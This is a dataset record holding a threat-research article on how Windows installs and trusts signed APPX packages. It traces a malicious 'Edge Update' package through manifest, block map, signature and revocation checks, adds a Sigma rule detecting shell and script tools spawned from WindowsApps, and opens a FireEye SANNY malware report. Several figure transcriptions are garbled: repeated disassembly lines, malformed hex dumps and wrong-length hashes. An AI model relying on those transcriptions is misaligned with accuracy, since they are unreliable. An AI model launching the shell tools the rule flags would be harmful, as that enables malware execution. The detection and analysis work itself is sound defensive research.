`AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Potentially Suspicious Windows App Activity",
      "id": "f91ed517-a6ba-471d-9910-b3b4a398c0f3",
      "status": "test",
      "description": "Detects potentially suspicious child process of applications launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
      "references": [
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-12",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|contains": "C:\\Program Files\\WindowsApps\\"
        },
        "selection_susp_img": {
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "selection_susp_cli": {
          "CommandLine|contains": [
            "cmd /c",
            "Invoke-",
            "Base64"
          ]
        },
        "filter_optional_terminal": {
          "ParentImage|contains": ":\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal",
          "ParentImage|endswith": "\\WindowsTerminal.exe",
          "Image|endswith": [
            "\\powershell.exe",
            "\\cmd.exe",
            "\\pwsh.exe"
          ]
        },
        "condition": "selection_parent and 1 of selection_susp_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate packages that make use of external binaries such as Windows Terminal"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_appx_execution.yml",
    "id": "513"
  },
  {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses 